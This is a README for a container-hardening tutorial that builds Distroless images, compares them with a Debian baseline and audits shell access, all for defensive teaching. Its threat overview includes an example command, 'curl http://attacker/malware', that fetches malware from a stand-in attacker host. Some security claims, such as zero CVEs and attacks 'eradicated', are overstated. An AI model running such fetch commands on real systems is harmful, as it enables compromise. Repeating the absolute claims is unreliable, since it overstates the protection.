<!-- markdownlint-disable MD013 -->
# Mini-Project 05: Distroless Hardened Container Runtimes

> **Domain**: 03. Containers & Image Optimization  
> **Level**: Beginner to Intermediate  
> **Infrastructure**: Local (Docker Engine / OrbStack)  

---

## 🎯 Overview & Context

In production DevSecOps, standard container images (Debian, Ubuntu, CentOS) contain
hundreds of unnecessary utilities, including interactive shells (`/bin/bash`,
`/bin/sh`), package managers (`apt`, `dpkg`), network downloaders (`curl`, `wget`),
and compilers (`gcc`, `make`).

If an attacker discovers a Remote Code Execution (RCE) vulnerability in an
application running in a traditional container, these included utilities provide
the exact tools needed to:

1. Spawn an interactive shell (`/bin/sh`).
2. Download remote rootkits or cryptocurrency miners (`curl http://attacker/malware`).
3. Install network scanners and privilege escalation tools (`apt-get install nmap`).
4. Move laterally through your Kubernetes cluster or host network.

```mermaid
flowchart TD
    subgraph TraditionalContainer ["❌ Traditional Debian / Ubuntu Container"]
        Attack1["Attacker finds Remote Code Execution (RCE)"] --> SpawnShell["Spawns /bin/sh or /bin/bash (UID 0)"]
        SpawnShell --> Downloader["Uses curl / wget to download malware"]
        Downloader --> PkgMgr["Uses apt / apk to install compiler / network scanner"]
        PkgMgr --> Compromised["💥 Host Breakout & Lateral Cluster Movement"]
    end

    subgraph DistrolessContainer ["🛡️ Google Distroless Hardened Container"]
        Attack2["Attacker attempts RCE / Shell Breakout"] --> NoShell["Exec /bin/sh -> 'executable file not found in $PATH'"]
        NoShell --> NoTools["No curl / wget / apt / dpkg present"]
        NoTools --> NonRoot["Runs as unprivileged nonroot (UID 65532)"]
        NonRoot --> Blocked["🔒 Attack Eradicated at Inception"]
    end
```



This mini-project demonstrates how to build and audit **Google Distroless**
hardened container images for:

- **Compiled Languages (Go / Rust / C)** using `gcr.io/distroless/static-debian12:nonroot`.
- **Interpreted Runtimes (Python)** using `gcr.io/distroless/python3-debian12:nonroot`.
- **Zero-Shell Security**: Proving that interactive shell execution is impossible.
- **Minimal Attack Surface**: Shrinking container size from >300MB to **<5MB** (>98% reduction).

---

## 🧠 Distroless Architecture & Security Mechanics

### 1. What is Google Distroless?

"Distroless" images contain **only your application and its runtime dependencies**.
They do not contain:

- ❌ No package managers (`apt`, `dpkg`, `apk`, `rpm`).
- ❌ No shells (`/bin/sh`, `/bin/bash`, `/bin/zsh`).
- ❌ No standard Linux core utilities (`ls`, `cat`, `ps`, `tar`, `chmod`, `chown`).
- ❌ No network downloaders (`curl`, `wget`, `nc`).

What Distroless **does contain**:

- ✔ CA Certificates (`/etc/ssl/certs/ca-certificates.crt`) for outbound HTTPS.
- ✔ Timezone data (`/usr/share/zoneinfo`).
- ✔ Minimal `/etc/passwd` entry with the unprivileged `nonroot` user (`UID 65532:65532`).
- ✔ `glibc` or static base depending on image variant.

---

### 2. Container Base Image Comparison Matrix

| Property | Debian / Ubuntu | Alpine Linux | Google Distroless (`static:nonroot`) | Chainguard Wolfi |
| :--- | :--- | :--- | :--- | :--- |
| **Typical Image Size** | 100MB – 900MB | 5MB – 50MB | **1.5MB – 5MB** | 3MB – 15MB |
| **Default User** | `root` (UID 0) | `root` (UID 0) | **`nonroot` (UID 65532)** | `nonroot` (UID 65532) |
| **Shell Included** | `/bin/bash`, `/bin/sh` | `/bin/sh` (Busybox) | **NONE (Eradicated)** | Optional / Minimal |
| **Package Manager** | `apt`, `dpkg` | `apk` | **NONE (Eradicated)** | `apk` |
| **CVE Vulnerability Count** | 50 – 200+ | 2 – 10 | **0 (Zero Known CVEs)** | 0 (Zero Known CVEs) |
| **Post-Exploit Risk** | High | Medium | **Minimal (Hardened)** | Minimal (Hardened) |

---

### 3. How to Debug Distroless in Production

Because Distroless containers have no `/bin/sh`, you cannot run `docker exec -it <container> sh`.
In modern production environments, use one of the following standard patterns:

1. **Kubernetes Ephemeral Containers (`kubectl debug`)**:

   ```bash
   kubectl debug -it <pod-name> --image=busybox:latest --target=<container-name>
   ```

2. **Docker Debug Tooling**:

   ```bash
   docker debug <container-name>
   ```

3. **Distroless `:debug` Images (Staging / Non-Production only)**:
   Google publishes `:debug` image tags (e.g. `gcr.io/distroless/static-debian12:debug`)
   that include a busybox shell specifically for troubleshooting.

---

## 📂 Project Structure

```text
03-containers/05-distroless-hardened-runtimes/
├── app/
│   ├── go.mod                    # Go module definition
│   ├── main.go                   # Statically compiled Go HTTP microservice
│   └── server.py                 # Python server for interpreted runtime demo
├── .dockerignore                 # Excludes build artifacts from context
├── Dockerfile.debian             # Vulnerable Debian baseline (contains bash, root user)
├── Dockerfile.distroless         # Hardened multi-stage Distroless Go container
├── Dockerfile.python-distroless  # Hardened Distroless Python container
├── security_audit.sh             # Automated security & shell penetration audit suite
└── README.md                     # Educational guide, architecture & cleanup instructions
```

---

## 🚀 Quickstart & Execution

### 1. Build and Run Debian Baseline Container (Vulnerability Demo)

```bash
docker build -f Dockerfile.debian -t devops-mini-proj-03-05-debian:latest .
docker run -d --name distroless-demo-debian -p 8080:8080 devops-mini-proj-03-05-debian:latest
```

#### Attempt Shell Penetration on Debian

```bash
docker exec -it distroless-demo-debian /bin/bash
```

Notice that you immediately get an interactive root shell:

```text
root@5f2a1b3c4d:/app# whoami
root
root@5f2a1b3c4d:/app# which apt curl gcc
/usr/bin/apt
/usr/bin/curl
/usr/bin/gcc
```

Stop and remove the baseline container:

```bash
docker rm -f distroless-demo-debian
```

---

### 2. Build and Run Hardened Google Distroless Container

```bash
docker build -f Dockerfile.distroless -t devops-mini-proj-03-05-distroless:latest .
docker run -d --name distroless-demo-hardened -p 8093:8080 devops-mini-proj-03-05-distroless:latest
```

#### Attempt Shell Penetration on Distroless

Attempt to spawn `/bin/sh` inside the running Distroless container:

```bash
docker exec -it distroless-demo-hardened /bin/sh
```

Output:

```text
OCI runtime exec failed: exec failed: unable to start container process:
exec: "/bin/sh": executable file not found in $PATH: unknown
```

Attempt to spawn `/bin/bash`:

```bash
docker exec -it distroless-demo-hardened /bin/bash
```

Output:

```text
OCI runtime exec failed: exec failed: unable to start container process:
exec: "/bin/bash": executable file not found in $PATH: unknown
```

#### Verify Non-Root User Execution

Query the security endpoint:

```bash
curl -s http://localhost:8093/security | jq .
```

Response:

```json
{
  "distroless_base": true,
  "gid": 65532,
  "is_non_root": true,
  "shell_eradicated": true,
  "uid": 65532
}
```

Stop the test container:

```bash
docker rm -f distroless-demo-hardened
```

---

## 🧪 Automated Security Audit & Penetration Suite

Run the automated test suite to audit both compiled (Go) and interpreted (Python)
Distroless images against the Debian baseline:

```bash
./security_audit.sh
```

To run audits and leave the containers running for manual experimentation:

```bash
./security_audit.sh --keep
```

### Expected Output Summary

```text
======================================================================
  🛡️ Google Distroless Container Runtime Security Audit Suite
======================================================================

Phase 1: Building Image Artifacts
  [PASS] Test 01: Docker Engine operational
         ↳ Docker CLI available
  [PASS] Test 02: Baseline Debian container image built
         ↳ Size: 842.15 MB
  [PASS] Test 03: Hardened Distroless Go container image built
         ↳ Size: 4.82 MB (99.4% size reduction)
  [PASS] Test 04: Distroless Python runtime image built
         ↳ Size: 61.20 MB

Phase 2: Interactive Shell Attack Simulation
  [PASS] Test 05: Vulnerability confirmed: Debian baseline exposes root shell (/bin/bash)
         ↳ Exec succeeded as root (UID 0)
  [PASS] Test 06: Hardened assertion: /bin/sh is completely eradicated in Distroless
         ↳ Exec denied: executable not found
  [PASS] Test 07: Hardened assertion: /bin/bash is completely eradicated in Distroless
         ↳ Exec denied: executable not found

Phase 3: Package Manager & Downloader Tooling Audit
  [PASS] Test 08: Package managers (apt, dpkg, apk) completely missing
         ↳ Attackers cannot install malware tooling
  [PASS] Test 09: Download utilities (curl, wget, nc) completely missing
         ↳ Prevents remote payload fetching

Phase 4: Runtime Privilege & API Probe Verification
  [PASS] Test 10: Container executes strictly as unprivileged nonroot (UID 65532)
         ↳ nonroot:nonroot verified
  [PASS] Test 11: Distroless microservice responds with HTTP 200 OK
         ↳ GET /health operational
  [PASS] Test 12: Interpreted Python Distroless runs without shell (/bin/sh missing)
         ↳ Interpreted runtime hardened

======================================================================
  📊 Container Runtime Hardening & Attack Surface Matrix
======================================================================
Image Variant              | Image Size   | Shell Present  | Pkg Manager    | Runtime User
---------------------------+--------------+----------------+----------------+-------------
Dockerfile.debian          | 842.15 MB    | YES (/bin/bash)| apt / dpkg     | root (0)
Dockerfile.distroless (Go) | 4.82 MB      | NONE (Eradicated)| NONE         | nonroot (65532)
Dockerfile.python-distroless| 61.20 MB    | NONE (Eradicated)| NONE         | nonroot (65532)
----------------------------------------------------------------------
```

---

## 🧹 Complete Resource Teardown & Cleanup Guide

To purge all containers, images, and test artifacts created during auditing:

### Method 1: Automated Cleanup (Recommended)

```bash
./security_audit.sh --clean
```

---

### Method 2: Manual Docker Image Cleanup

```bash
# 1. Stop and remove audit containers
docker rm -f distroless-audit-debian distroless-audit-distroless distroless-audit-python 2>/dev/null || true

# 2. Remove benchmark images
docker rmi -f \
    devops-mini-proj-03-05-debian:latest \
    devops-mini-proj-03-05-distroless:latest \
    devops-mini-proj-03-05-python-distroless:latest 2>/dev/null || true
```

#### Verify System is Pristine

Confirm that no project containers or images remain:

```bash
docker ps -a --filter "name=distroless-audit"
docker images | grep "devops-mini-proj-03-05"
```

If the outputs are empty, your environment is 100% clean and ready for the next
mini-project!
